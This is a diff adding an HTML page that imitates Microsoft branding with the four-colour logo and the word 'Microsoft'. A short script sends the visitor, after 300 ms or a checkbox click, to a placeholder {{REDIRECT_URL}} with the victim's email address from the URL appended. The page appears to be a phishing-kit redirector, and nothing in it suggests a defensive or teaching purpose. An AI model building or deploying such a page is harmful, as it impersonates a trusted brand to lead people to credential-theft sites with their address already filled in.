@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> </title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(redirect, 300);
+        });
+
+        // Function to handle redirection
+        function redirect() {
+            var email = getParameterByName('email'); // Attempt to get the email parameter
+            var redirectUrl = "{{REDIRECT_URL}}";
+
+            if (email) {
+                redirectUrl += email; // Append email if provided
+            } else {
+                console.log("No email provided. Redirecting without email.");
+            }
+
+            console.log("Redirecting to: " + redirectUrl);
+            window.location.href = redirectUrl;
+        }
+
+        // Function to get URL parameters
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            var results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Function to manually trigger redirection via checkbox
+        function handleCheckboxClick(checkbox) {
+            if (checkbox.checked) {
+                console.log("Checkbox is checked. Redirecting...");
+                redirect();
+            } else {
+                console.log("Checkbox is not checked.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div style="display: flex; justify-content: center;  align-items: center; font-family: Arial, sans-serif;">
+        <div style="display: flex; flex-direction: column;">
+            <!-- First row -->
+            <div style="display: flex;">
+                <div style="width: 20px; height: 20px; background-color: #F25022; margin-right: 2px;"></div>
+                <div style="width: 20px; height: 20px; background-color: #7FBA00;"></div>
+            </div>
+            <!-- Second row -->
+            <div style="display: flex; margin-top: 2px;">
+                <div style="width: 20px; height: 20px; background-color: #00A4EF; margin-right: 2px;"></div>
+                <div style="width: 20px; height: 20px; background-color: #FFB900;"></div>
+            </div>
+        </div>
+        <div style="font-size: 25px; font-weight: normal; color: #5E5E5E; margin-left: 10px;">
+            Microsoft
+        </div>
+    </div> 
+    <label>
+        <input type="checkbox" onclick="handleCheckboxClick(this)">
+        Redirecting... Please wait. or click this box to continue.
+    </label>
+</body>
+</html>
